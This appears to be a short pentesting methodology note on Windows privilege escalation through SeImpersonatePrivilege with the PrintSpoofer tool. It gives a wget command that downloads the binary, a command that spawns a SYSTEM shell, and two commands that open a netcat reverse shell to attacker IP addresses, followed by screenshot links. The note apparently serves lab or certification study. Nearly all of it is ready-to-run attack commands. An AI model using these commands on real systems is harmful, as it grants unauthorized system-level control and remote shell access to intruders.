With this privilege we should try this attack: (Keep in mind machine architecture)
## Printspoofer:
wget <https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe>
If you have interactive shell:
.\PrintSpoofer64.exe -i -c cmd

if you don't, then try:
.\PrintSpoofer64.exe -c "c:\Tasks\nc.exe 192.168.119.199 443 -e cmd"
.\PrintSpoofer64.exe -c "c:\Tasks\nc.exe 10.8.24.10 443 -e cmd"

![unnamed_17f87588846f4e4fbf64f4d379cc57ce](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeImpersonatePrivilege/PrintSpoofer/{{notename}}-202605011506.png)
![unnamed_e78fbe1324b949d7abb670f006a8ea92](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeImpersonatePrivilege/PrintSpoofer/{{notename}}-202605011506-1.png)
